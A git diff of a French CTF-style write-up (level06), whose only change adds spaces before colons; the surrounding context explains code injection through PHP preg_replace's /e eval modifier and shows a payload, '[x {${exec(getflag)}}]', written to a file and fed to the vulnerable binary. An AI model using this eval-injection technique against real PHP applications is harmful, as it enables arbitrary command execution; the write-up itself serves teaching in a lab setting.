@@ -24,11 +24,11 @@ print $r;
 ```
 > La partie interessante dans le code est <code>/(\[x (.*)\])/e</code> car le **preg_replace** utilise le *modifier* **/e** ou **(PREG_REPLACE_EVAL)**, qui est connu pour être sensible aux injections (Il n'existe meme plus en PHP 7.0.0)
 
-On comprend que le format pour la string recupérée du <code>file_get_contents</code> doit être formatée de la manière suivante:
+On comprend que le format pour la string recupérée du <code>file_get_contents</code> doit être formatée de la manière suivante :
 
 <code>/(\[x (.*)\])/e => [x {${INJECTION}}]</code>
 
-L'injection permet de remplacer le <code>(.*)</code> par une commande, comme par exemple **getflag**:
+L'injection permet de remplacer le <code>(.*)</code> par une commande, comme par exemple **getflag** :
 
 <pre><code>> echo '[x {${exec(getflag)}}]' > /tmp/inject
 > ./level06 /tmp/inject
